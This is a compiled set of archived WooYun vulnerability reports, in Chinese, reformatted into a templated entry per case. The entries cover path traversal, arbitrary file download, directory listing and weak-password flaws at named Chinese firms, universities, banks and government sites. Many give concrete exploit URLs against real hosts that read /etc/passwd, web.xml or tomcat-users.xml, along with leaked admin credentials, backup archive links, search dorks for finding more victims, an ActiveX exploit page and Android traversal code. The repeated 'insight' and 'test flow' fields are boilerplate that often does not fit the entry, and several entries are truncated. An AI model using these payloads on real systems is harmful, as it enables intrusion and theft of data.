**绕过**: 直接利用

**修复**: 增加查询权限的控制。应该各院校老师只能查询名下的学生信息，而不是所有学生。
---

---
### [wooyun-2015-0119745] 吉祥人寿主站存在任意文件下载漏洞
**厂商**: 吉祥人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 想找到这个漏洞，必须先注册一个帐号然后登录进系统，即点击官网右上角的登录按钮我注册过了所以直接登录了在个人空间右上角百宝箱处，有一个办理流程及应备文件查询点击保全业务办理指引跳转到一个新页面此时可以得到漏洞urlhttp://www.jxlife.com.cn/online/mis/download/busProcess.do?filename=206_1390353383470.pdf构造http://www.jxlife.com.cn/online/mis/download/busProcess.do?filename=../../../../../../../../etc/hosts退出系统，该漏洞无须登录状态

**POC**: http://www.jxlife.com.cn/online/mis/download/busProcess.do?filename=../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2015-091694] MetInfo最新版任意文件读取
**厂商**: MetInfo | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MetInfo 5.2（当前最新版本）的 include/thumb.php 文件本来用来获取缩略图，但是其构造的缩略图路径存在外部可控变量，攻击者可以借此获取任意文件内容：include/thumb.php关键代码如下：<?php$ext1 = explode("/", $dir);  //$dir变量由外部传入$count = count($ext1);$count1 = $ext1[$count-1];$ext2 = explode(".", $count1);$ext3 = $ext2[1];  // $ext3为$dir变量文件名后缀$path1 = $ext2[0]; // $ext3为$dir变量文件名称$dir1 = '..https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/thumb_src/'.$x.'_'.$y.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 处理好相关逻辑！
---

---
### [wooyun-2015-0156430] 从一个“无标题”邮件到QQ邮箱服务器文件下载（运行日志、附件等）
**厂商**: 腾讯 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 首先，是我的误操作，导致发送了一个“无标题”也没有发件人的“贺卡”。看来是QQ邮箱后端处理出现问题了，正好当时开着抓包软件，就开始分析了。今天已经无法重新这个发“无标题”邮件的操作了，结合后文所述，应该是被修复了。还好我留了一封，截图做纪念：2. 为了找到导致这个BUG的原因，我先将邮件正文替换为aaaa，发现邮件恢复正常，于是局部删除邮件内容，最后删除到只剩下以下内容时，出现了奇怪的情况。/cgi-bin/viewfile?f=13233D0948115D858519BF93BD54FF886202F13BF853330C64A28B5A1AF42AA3BBA42274B655A284D586A6E0A6F8E89A52EB57A9F990FED871606D2C2EA2B9B679646DF7AC74F0AF50FE438B43BA3FD12FD061B11B1B92BEE0AD

**POC**: 如上。

**绕过**: 直接利用

**修复**: 1. 整个过程是在发自定义明信片的时候测试的，具体请求为：https://set2.mail.qq.com/cgi-bin/compose_send?sid=参数如下图所示：这个是会意外解密出路径的明文的BUG的位置，此外bcc处的收件人允许 ../../之类的2. 泄漏明文加密的是在上述请求里添加
---

---
### [wooyun-2014-086577] Baidu的Bae沙盒绕过获取敏感信息
**厂商**: 百度 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从phpinfo中可看出，环境是在bae用户下跑，通过svn库中新增文件ln -s /etc/passwd bae.phpsvn 提交后，到bae控制台上线新版直接访问http://yourname.duapp.com/bae.php,即可读取到 非php-web沙盒环境的/etc/passwd文件

**POC**: 第一张是通过php执行读取的etc/passwd文件，可以看出是沙盒环境第2张 从用户名列表可以看出 内容已经不一样了，绕过了沙盒环境

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-058407] 云南大学分站任意文件下载源码泄露
**厂商**: 云南大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.mba.ynu.edu.cn/downs.jsp?url=/WEB-INF/web.xml和www.edp.ynu.edu.cn/downs.jsp?url=/WEB-INF/web.xmlwww.mba.ynu.edu.cn/downs.jsp?url=/WEB-INF/web.xmlpg" />没有对downs.jsp进行过滤还有2个站备份文件泄露：www.evolution.ynu.edu.cn/web.rarwww.job.ynu.edu.cn/wwwroot.rar

**POC**: pg" />

**绕过**: 直接利用

**修复**: downs.jsp文件做验证。
---

---
### [wooyun-2015-0153006] 新华人寿某处配置不当泄露大量员工信息
**厂商**: 新华人寿保险股份有限公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://123.127.246.3:8001/lms/app/login/login.jsphttp://123.127.246.3:81/存在目录遍历

**POC**: 2W多员工信息

**绕过**: 直接利用

**修复**: 正确配置
---

---
### [wooyun-2015-0135263] 上海公交集团—公共交通广告公司疑似被黑+源码下载
**厂商**: 上海公交集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 公共交通广告公司虽然域名不是**.**.**.**，但也是上海公交集团旗下的一家公司漏洞一：疑似被黑http://**.**.**.**/Default.asphttp://**.**.**.**/default.asp漏洞二：网站备份文件下载该站上存在很多系统：**.**.**.**/Login.aspx  上海公交候车设施管理系统(浦西地区)**.**.**.**:8001/Login.aspx   候车设施管理系统**.**.**.**:8080   上海公交车辆媒体广告管理系统**.**.**.**:8084/  上海公交候车媒体销售系统(浦西地区)**.**.**.**:8086   上海公交车辆媒体广告管理系统**.**.**.**:8383   广告业务信息系统**.**.**.**:8181/  候车设施查询系统**.**.**.**:8384/  办公自动化系统**.**

**POC**: 如上

**绕过**: 直接利用

**修复**: 安全意识太薄弱，不能把安全交托付给集成公司提供的安全设备
---

---
### [wooyun-2015-0137411] 东莞政府门户网站任意文件下载
**厂商**: 广东省信息安全测评中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: 将参数key值修改，发现可以跳脱网站路径，下载系统上的文件/etc/passwd和其他系统上档案：http://**.**.**.**/ucapformsresource/resourceservlet.ucap?filename=/etc/passwd&key=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd攻击成功需要进行url encode，后端似乎有load balance或是阻挡，送出同样语法时，有时却会回应404、403。挂tor换IP的成功率会增

**绕过**: 直接利用

**修复**: 限制路径限制扩展名
---

---
### [wooyun-2014-080862] 某方式可成功获取开心网某手机游戏服务器权限
**厂商**: kaixin001.com | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过撞库成功获取袁海娜的邮箱，在其邮箱成功获取了相关信息mask 区域1.http://**.**.**/还有部分目录遍历的情况！这个是在游戏配置文件中找到的！_*************** IDRAC IP        ********************.22.184.67	/ eth3(사********************.184.68	    ********************.184.69	    ********************.184.70	    ********************.184.71	    ****************************** 모두 동********************roo**********^是马********************= 360************************

**POC**: 由于是国内厂商，并未对服务器进行深入渗透，避免影响其运行.

**绕过**: 直接利用

**修复**: 加强安全体系的管理，增强密码强度，尽量避免使用通用密码,，加强服务器授权访问！
---

---
### [wooyun-2013-043662] 乐视网#又一个视频编码器后台弱口令及其他问题
**厂商**: 乐视网 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没事又扫了一下ip段，之前的视频编码器弱口令已经修复了。发现一条漏网之鱼~地址：http://115.182.51.183/html/encoder/index.html密码 user设计多个省市，TVBSG，TVBS，lvyou，bjwy，河南，山西，河北，天津设备均可关机，重启另外一处目录遍历，VIP电影可直接下载http://115.182.51.76/VIP/

**POC**: (见原文)

**绕过**: 编码绕过

**修复**: 接着改密码吧~
---

---
### [wooyun-2016-0207113] 浙江某农村合作银行存在弱口令/源文件下载/导致21w用户信息泄露（签约银行卡/手机号码/证件号码/用户名）
**厂商**: 浙江农信 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/admin/       账号admin爆破得到密码superman源文件下载http://**.**.**.**/web.rar

**POC**: http://**.**.**.**/admin/       账号admin爆破得到密码superman源文件下载http://**.**.**.**/web.rar

**绕过**: 直接利用

**修复**: 打码不够完整，审核完后请打码，下载数据已经删除！
---

---
### [wooyun-2013-028000] 安徽省图书馆任意任意文件读取可获取Tomcat管理密码
**厂商**: 安徽省图书馆 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ahlib.com/ahlib/addcontent/webEditorhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/files/file_down.jsp?filename=../../../../../../conf/tomcat-users.xml以前的记录的用户名是adminmanager 密码是717825hnkjhttp://www.ahlib.com/manager/html发现登陆不上，手贱，把tomcat-users.xml下下来了成功登陆后面的操作就不用我说了吧，以前的马儿已经被删了，就不重新上传war了

**POC**: 安徽的很多网站都存在这样的问题，关键词输入inurl:/addcontent/webEditor/有关部门赶紧修一下吧，也算为家乡做点贡献

**绕过**: 直接利用

**修复**: 对file_down.jsp进行过滤
---

---
### [wooyun-2014-061743] 中国人民大学招生网备份文件下载
**厂商**: 中国人民大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国人民大学招生网备份文件下载  可导致用户报名信息泄露

**POC**: http://www.ruc-edu.org/web.rar  下载链接

**绕过**: 直接利用

**修复**: 这就不用我会说了吧
---

---
### [wooyun-2016-0166833] 中国电信天翼领航多个分站任意文件下载漏洞 (附C++ libcurl测试脚本）
**厂商**: 中国电信 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 【天翼领航主站】：**.**.**.**【以下5个省份存在通用的任意文件下载漏洞】天津：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=/../../../../download2.jsp山西：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp广西：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp河北：http://**.**.**.**/xbn

**POC**: 最近在学习libcurl 厂商可以使用编译下面的程序来进行修复检测，Win平台 VS2010下编译通过；Linux下请修改头文件。#define CURL_STATICLIB  //必须在包含curl.h前定义#include<string>#include<stdio.h>#include"curl/curl.h"#include<iostream>#include<Windows.h>//以下四项是必须的#pragma comment ( lib, "libcurl.lib" )#pragma comment ( lib, "ws2_32.lib" )#pragma comment ( l

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091206] 北京师范大学MAS代理服务器任意文件下载
**厂商**: 北京师范大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京师范大学MAS代理服务器任意文件下载http://mas.bnu.edu.cnhttp://mas.bnu.edu.cn/serverLog.do?act=upload&fileName=../../../../../../../../../../etc/passwd解压passwd.zip

**POC**: http://mas.bnu.edu.cn/serverLog.do?act=upload&fileName=../../../../../../../../../../etc/passwd解压passwd.zip

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0165722] 大信控股某站目录遍历漏洞／openssl heartbleed漏洞
**厂商**: 大信控股 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如题，存在目录遍历的地方为上传文件，可获取最近公司招聘的人员信息及服务器版本信息http://**.**.**.**/uploads/简历信息还是挺详细的。下面是heartbleed漏洞验证，并未做利用

**POC**: RT

**绕过**: 直接利用

**修复**: 1)正确配置权限；2）打上相应的漏洞补丁；3）加强管理。
---

---
### [wooyun-2014-058969] 139邮箱任意文件读取漏洞
**厂商**: 139邮箱 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 139邮箱解析xml存在问题导致实体注入

**POC**: 给自己发一封邮件 拦下请求，修改content字段收到邮件的正文即为/etc/passwd内容

**绕过**: 直接利用

**修复**: 换个解析器吧
---

---
### [wooyun-2015-0119892] 21cn某站存在备份文件下载发生的血案-泄露大量文件
**厂商**: 世纪龙信息网络有限责任公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 下载地址http://finance.21cn.com/a.zip看起来很牛逼的样子

**绕过**: 直接利用

**修复**: 删除你们更专业！求rank
---

---
### [wooyun-2015-0100456] 中信银行某IE控件可导致用户文件系统被枚举
**厂商**: 中信银行 | **年份**: 2015 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中信银行某IE控件可导致用户文件系统被枚举CITICSCP.dll控件提供的API中，IsInvalidCertFile API可以被用来判断浏览器用户的本地文件是否存在，当文件不存在时返回一个错误号。攻击者可利用这个API来判断被攻击者硬盘目录中是否存在某一特定文件，将需对比的文件名放在数组中，则可实现目录遍历，为更深层次攻击提供情报支持，如确定系统或软件的某一特定文件是否存在来判断被攻击者使用了什么版本的软件和系统，然后可以执行有针对性攻击或漏洞挖掘，或者判断计算机中是否存在某一特定文档来确定该计算机是否是需要攻击的目标。

**POC**: 下面的视频文件是实际测试情况，测试目标是判断c:/a.txt,c:/a1.txt两个文件是否存在，存在则打印到页面中http://1drv.ms/1MoAJa3

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-040848] 艺龙旅行网某软路由服务器任意系统文件下载漏洞
**厂商**: 艺龙旅行网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器地址：http://211.151.230.34/可以看到是个ROUTER OS的软路由，而且从下图可以看出该服务器是elong的：GET请求：RequestGET /../../../../../../../../../../etc/passwd HTTP/1.1Referer: http://211.151.230.34:80/Host: 211.151.230.34Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*root:x:0:0:root:/root:/bin/b

**POC**: /etc/resolv.conf文件，可以看到内网DNS：服务：

**绕过**: 直接利用

**修复**: 可能是软路由版本过低，升级下
---

---
### [wooyun-2015-092405] 微拍某站点目录遍历
**厂商**: 微拍 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞网站：http://c.weipai.cn/我也是醉了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-059265] 赛迪网主站目录遍历/下载(FTP密码泄漏)
**厂商**: 赛迪网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 赛迪网主站目录遍历查看，可以用迅雷下载，里面包含FTP账号密码不知道是不是，目录挺多的！里面包含rar，doc，jpg，gif，html，swf，mp3，wav，txt等等文件！在我翻的时候，貌似翻到黄色视频，地址都写了，不过试了2个都没有视频，网监抓得很严的哦！我翻了一半目录就累死我了！随便提交乌云算了！

**POC**: 顾着翻东西，忘记截图了!太累了，你们自己翻吧！如果厂商不收这个漏洞，大家爱看的自己翻去！

**绕过**: 直接利用

**修复**: 厂商比我懂！
---

---
### [wooyun-2014-060587] 温州市公共资源交易网任意文件下载漏洞
**厂商**: 温州市公共资源交易网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 温州市公共资源交易网任意文件下载漏洞

**POC**: http://www.wzzbtb.com/wfxxgg/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../../web.confighttp://www.wzzbtb.com/wfxxgg/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../Manage/ValidateCode.aspxhttp://www.wzzbtb.com/wfxxgg/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file

**绕过**: 直接利用

**修复**: 你们懂得~
---

---
### [wooyun-2014-069996] 湖北省扶贫网任意文件下载
**厂商**: 湖北省 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖北省农村贫困劳动力转移培训雨露网http://www.hbyl.gov.cn/upload.jsp?name=../viewnew.jsphttp://www.hbyl.gov.cn/upload.jsp?name=../index.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加文件操作参数加过滤
---

---
### [wooyun-2013-044085] 赛迪网某站漏洞任意文件遍历下载
**厂商**: 赛迪网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站：http://115.182.21.51一、目录遍历话说这个扫出来的结果好变态：http://115.182.21.51/siterank.php?ranktype=invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: group:网络配置文件：

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2014-081757] 致远A8协同管理系统"后门"一样的Log泄露JSESSIONID可登陆用户
**厂商**: seeyon.com | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于致远A8协同管理系统会对用户登录信息进行日志记录，可是日志文件存放在web目录的logs子目录下，并且未作任何权限控制，测试发现大部分在用系统都存在logs目录遍历漏洞，因此导致致远A8协同管理系统用户登录信息无节操泄露百度搜索： 更改语言: A8企业版 (并发数:100) 用户名 : 密码: 辅助程序安装

**POC**: (1)http://119.60.8.250http://119.60.8.250/logs/http://119.60.8.250/logs/login.log(2) http://oa.hkfs.cn/http://oa.hkfs.cn/logs/http://oa.hkfs.cn/logs/2014-10-31/login.log.2014-10-31.1(3)http://61.177.183.195/http://61.177.183.195/logs/http://61.177.183.195/logs/2014-10-31/login.log.2014-10-31.1(4)htt

**绕过**: 直接利用

**修复**: 日志目录移出web目录
---

---
### [wooyun-2014-059850] 汇文软件Libsys图书馆管理系统任意文件读取
**厂商**: libsys.com.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版本：5.0不需要登录/zplug/ajax_asyn_link.old.php中参数url未合理过滤导致一处任意文件读取漏洞官方演示站点exp演示：http://202.119.47.33:81/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php查看源代码：解密后可登陆后台成功：该建站系统有不少高校用户：验证使用该建站系统站点成功利用该漏洞：厦门大学：http://opac.xmulib.org/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php温州大学：http://opac.wzu.edu.cn/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php

**POC**: 如上

**绕过**: 直接利用

**修复**: 过滤url参数，或仅允许读取特定需要读取文件
---

---
### [wooyun-2015-099701] 上海证券交易所IE插件可导致用户本地文件泄漏
**厂商**: 上海证券交易所 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海证券交易所IE插件可导致用户本地文件被读取actV3 IE控件提供的接口ReadLocalFile可读取用户计算机硬盘上的文件，如果一个文件可以以读写形式打开，并且大小不较大（测试中发现980K字节以内可顺利读取显示），则可被该函数读取内容。虽然读取出的内容被编码，但该控件提供的Decode接口可以解码读取到的内容并以字符串形式返回。虽然ReadLocalFile可以读取任何文件类型，但是Decode接口返回的是带结束符号的字符串，所以如果是纯字符串内容的文件，则可顺利获取所有内容；否则只能获取到第一个字符串结束符之前的字符串内容了。当配合我提交的另一个上证所IE插件的漏洞使用时，则可以先使用那个漏洞判断文件是否存在和大小，然后使用这个漏洞获取文件内容。或者在之前已经知道需要的文件的具体目录位置，则可直接使用这个漏洞去读取内容。

**POC**: http://biz.sse.com.cn/sseportal/ps/zhs/ca/ca_activex_control_check.jsp可在上面的页面中下载安装ActV3控件。<html>Test Exploit page<object classid='clsid:3DE5C04B-916B-40FC-B976-60119CA5EB21' id='target' ></object><script language='javascript'>document.write("<p/>ReadLocalFile+Decode:can read a limited sized file(fil

**绕过**: 编码绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-044407] 赶集网Android客户端Content Provider组件任意文件读取漏洞
**厂商**: 赶集网 | **年份**: 2013 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 后台管理

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported="true",对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过"../"实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据，不是麽）。

**POC**: public void GJContentProviderFileOperations(){try{InputStream in = getContentResolver().openInputStream(Uri.parse("content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml"));ByteArrayOutputStream out = new ByteArrayOutputStream();byte[] buffer = new byte[1024];int n = in.read(b

**绕过**: 直接利用

**修复**: 凡只用于内部调用的组件，导出配置都应该设置为false，即android:exported="false"。
---

---
### [wooyun-2011-01420] 网易多个分站目录遍历，不重视我再发一遍
**厂商**: 网易 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网易多个分站目录遍历，这个服务器配置错误已经公开多时。个别有几个已经做过处理，但是处理的不全面。。虽然对服务器没有太大威胁，但是敏感信息还是不要泄露的好。。希望网易重视这个配置错误漏洞！

**POC**: http://weixing.163.com/.svn/entrieshttp://click1.163.com/.svn/entrieshttp://bbs.sports.163.com/.svn/entrieshttp://bbs.lady.163.com/.svn/entrieshttp://bbs.163.com/.svn/entries

**绕过**: 直接利用

**修复**: 对服务器进行全面的检查修复!
---

---
### [wooyun-2015-0132011] 中国国旅b2b网站任意文件下载
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题网址：http://b2b.cits.com.cn/citsonlineWeb/online/messageBBS/openFile.jsp?&fileName=../../../../etc/passwd将参数fileName值修改，发现可以跳脱网站路径，下载系统上的文件/etc/passwd和其他系统上档案。

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 限制路径限制扩展名
---

---
### [wooyun-2014-084251] 真旅网集团网站列目录及备份文件下载漏洞
**厂商**: 真旅网集团 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 真旅网集团网站列目录及备份文件下载漏洞http://old.tdxinfo.com/config/同时根目录下存在bin.rar文件，里面是网站的dll文件，如图

**POC**: 如上

**绕过**: 直接利用

**修复**: 删除备份文件
---

---
### [wooyun-2014-089133] 兴业银行某站存在文件任意包含下载漏洞
**厂商**: 兴业银行 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 兴业银行主站分频道金融市场存在文件任意包含下载漏洞，通过爬虫信息，可以下载整站的JSP源码，泄露web.xml等敏感信息！附带几个bak源码备份文件，望及时修复删除！问题站点：http://222.73.46.144/wealth/default.jsp任意文件下载点：http://fortune.cib.com.cn/http://222.73.46.144/futures/picl.jsp?fileName=WEB-INF/web.xmlbak源码备份文件：http://222.73.46.144/product/orgFinList.jsp.bakhttp://222.73.46.144/index/report.jsp.bakhttp://222.73.46.144/product/content.jsp.bakhttp://222.73.46.144/price/about.js

**POC**: （1）包含web.xml（2）随便包含个JSP源码从web.xml可以发现有安装FCKeditor,从漏洞源码可以看出只要是gif,jpg,swf后缀的文件就可以包含进文件，攻击者可以上传个图片马，试图得shell,这些都是隐患！银行站点，就这样了，未深入！

**绕过**: 直接利用

**修复**: 修改下源码，过滤！
---

---
### [wooyun-2015-0149777] 华东师范大学某网站存在任意文件遍历漏洞
**厂商**: 华东师范大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

